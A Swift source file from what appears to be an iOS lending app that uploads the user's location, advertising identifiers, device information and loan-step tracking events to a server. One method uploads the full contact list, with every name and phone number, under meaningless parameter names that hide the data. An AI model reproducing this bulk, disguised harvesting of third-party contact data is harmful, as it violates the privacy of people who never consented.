//
//  LDUploadingInfoManager.swift
//  LaunchDinero
//
//  Created by wangxiang on 2025/2/24.
//

import Foundation
import Contacts

enum FengKongMaiDian: Int {
    case ZhuCeMaiDian = 1
    case ShenFenZhengZhengMian = 2
    case ShenFenZhengBeiMian = 3
    case GeRenXinXi = 4
    case GongZuoXinXi = 5
    case LianXiRen = 6
    case BangKa = 7
    case KaiShiJieDai = 8
    case JieShuJieDai = 9
}

class LDUploadingInfoManager {
    static func location() {
        LDLocation.shared.AddressClourse = { value1, value2, value3, value4, value5, value6 in
            LDReqManager.request(url: .uploadingLocationUrl(params: ["felt": value3,
                                                                     "sentimental": value2,
                                                                     "being": value1,
                                                                     "without": value6,
                                                                     "nev": value4,
                                                                     "bbc": value5,
                                                                     "five": LDLocation.shared.latitude,
                                                                     "pierce": LDLocation.shared.longitude,]), modelType: LDModel.self) { _ in
                LDLocation.shared.stop()
            }
        }
        LDLocation.shared.start()
    }
    
    static func idfaIdfv() {
        LDReqManager.request(url: .uploadingIdfvIdfaUrl(params: ["little": LDDevice.info.idfv, "amounts": LDDevice.info.idfa]), modelType: LDModel.self) { _ in
            print("")
        }
    }
    
    static func fengkpoint(num: FengKongMaiDian, beginTime: String = LDNowTime(), endTime: String = "", pID: String = "", orderNO: String = "") {
        var params: [String: Any] = ["morning": "\(num.rawValue)",
                                     "graph": orderNO,
                                     "fourier": LDDevice.info.idfv,
                                     "theory": (num == FengKongMaiDian.KaiShiJieDai || num == FengKongMaiDian.JieShuJieDai) ? beginTime : endTime,
                                     "describes": beginTime, "describing":2, "advanced": LDDevice.info.idfa]
        LDPermissionManager.location { isAllow in
            if isAllow {
//                DispatchQueue.main.async {
                    LDLocation.shared.LocationClourse = {
                        params["pierce"] = LDLocation.shared.longitude
                        params["five"] = LDLocation.shared.latitude
                        LDReqManager.request(url: .uploadingBasePointUrl(params: params), modelType: LDModel.self) { _ in
                            LDLocation.shared.stop()
                        }
                    }
                    LDLocation.shared.start()
//                }
            } else {
                params["pierce"] = "0"
                params["five"] = "0"
                LDReqManager.request(url: .uploadingBasePointUrl(params: params), modelType: LDModel.self) { _ in
                    print("")
                }
            }
        }
    }
    
    static func deviceInfo() {
        var params: [String: Any] = [:]
        if let data = try? JSONSerialization.data(withJSONObject: LDDevice.info.params, options: []), let jsonStr = String(data: data, encoding: .utf8) {
            params["financial"] = jsonStr
        }
        LDReqManager.request(url: .uploadingDeviceInfoUrl(params: params), modelType: LDModel.self) { _ in
            print("")
        }
    }
    
    static func contacts() {
        let keysList: [CNKeyDescriptor] = [CNContactGivenNameKey as CNKeyDescriptor,
                                       CNContactFamilyNameKey as CNKeyDescriptor,
                                       CNContactPhoneNumbersKey as CNKeyDescriptor,
                                       CNContactBirthdayKey as CNKeyDescriptor,
                                       CNContactEmailAddressesKey as CNKeyDescriptor,]
        
        let request = CNContactFetchRequest(keysToFetch: keysList)
        
        DispatchQueue.global().async {
            do {
                var list: [[String: Any]] = []
                
                try CNContactStore().enumerateContacts(with: request) { contact, objcBool in
                    var item: [String: Any] = [:]
                    item["kate"] = contact.phoneNumbers.map({$0.value.stringValue}).joined(separator: ",")
                    item["scorer"] = contact.givenName + " " + contact.familyName
                    list.append(item)
                }
                var params: [String: Any] = [:]
                if let data = try? JSONSerialization.data(withJSONObject: list, options: []), let jsonStr = String(data: data, encoding: .utf8) {
#if DEBUG
                    params["financial"] = jsonStr
#else
                    params["financial"] = jsonStr
                    #endif
                }
                LDReqManager.request(url: .uploadingContactsUrl(params: params), modelType: LDModel.self) { _ in
                    print("")
                }
            } catch {
                print("Contacts Failure")
            }
        }
    }
}
